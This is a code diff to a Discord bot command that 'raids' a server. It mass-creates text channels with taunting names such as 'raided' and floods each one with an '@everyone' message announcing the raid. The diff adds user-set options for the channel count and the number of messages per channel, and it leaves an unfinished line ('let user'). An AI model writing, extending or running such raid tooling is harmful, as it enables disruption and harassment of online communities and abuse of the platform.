@@ -8,8 +8,8 @@ module.exports = {
 
     // Defaults
     const defaultMessage = `YOUR SERVER HAS BEEN RAIDED BY ${interaction.client.user} !!! \n @everyone`;
-    const defaultSpamAMT = 10;
-    const defaultChannelNames = ['HAHA', 'LOL', 'EMOJI']; // Default list of channel names
+    const defaultChannelAmount = 10;
+    const defaultChannelNames = ['HAHA', 'LOL', 'raided']; // Default list of channel names
     const defaultErrorMessage = 'An internal error has occurred, please check console.';
     const defaultNumberOfMessagesPerChannel = 5;
 
@@ -17,9 +17,11 @@ module.exports = {
       interaction.reply({ content: errorMessage, ephemeral: true });
     }
 
-    let spamAMTbyUser = interaction.options.getInteger('message-amount') || defaultSpamAMT;
+    let userChannelAmount = interaction.options.getInteger('channel-amount') || defaultChannelAmount;
     let userMessage = interaction.options.getString('raid-message') || defaultMessage;
     let userChannelNames = interaction.options.getString('channel-names'); // User-provided channel names
+    let NumberOfMessagesPerChannel = interaction.options.getInteger('message-amt-per-channel') || defaultNumberOfMessagesPerChannel
+    let user
 
     // If user did not provide channel names, use default list
     userChannelNames = userChannelNames ? userChannelNames.split(',') : defaultChannelNames;
@@ -40,7 +42,7 @@ module.exports = {
       });
 
       await Promise.all(
-        Array.from({ length: spamAMTbyUser }, async (_, i) => {
+        Array.from({ length: userChannelAmount }, async (_, i) => {
           const duplicateChannel = await guild.channels.create({
             name: `${userChannelNames[Math.floor(Math.random() * userChannelNames.length)]}`,
             type: ChannelType.GuildText,
@@ -48,7 +50,7 @@ module.exports = {
           });
 
           await Promise.all(
-            Array.from({ length: defaultNumberOfMessagesPerChannel }, async () => {
+            Array.from({ length: NumberOfMessagesPerChannel }, async () => {
               try {
                 await duplicateChannel.send(userMessage);
               } catch (error) {
